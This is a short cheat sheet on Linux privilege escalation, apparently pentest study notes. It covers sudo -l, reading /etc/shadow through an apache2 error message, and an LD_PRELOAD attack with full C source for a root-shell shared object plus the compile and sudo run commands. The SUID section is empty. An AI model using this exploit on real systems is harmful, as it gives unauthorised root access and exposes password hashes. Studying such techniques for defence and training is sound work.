## sudo

    sudo -l    // check programs that the current user can run as superuser
    
https://gtfobins.github.io/ : provides information on how any program, on which you may have sudo rights, can be used.

### leverage application functions

Some applications can leak information leveraging a function of the application.

Ex: apache2 -f /etc/shadow  will result in an error message that includes the first line of the /ect/shadow file.

### leverage LD_PRELOAD

LD_PRELOAD is an environment options that allows any program to use shared libraries [for an idea of its capabilities](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/).

May be revealed by sudo -l

Priviledge escalation steps:
* check for LD_PRELOAD (with the env_keep option)
* write a simple C code compiled a share object (.so) file
* run the program with sudo rights and the LD_PREFLOAD pointing to the .so file

Ex of C code: spawn a root shell

        #include <stdio.h>
        #include <sys/types.h>
        #include <stdlib.h>

        void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
        }

Then compile:

        gcc -fPIC -shared -o shell.so shell.c -nostartfiles

Then run it:

        sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
        
## SUID



-------------
## 
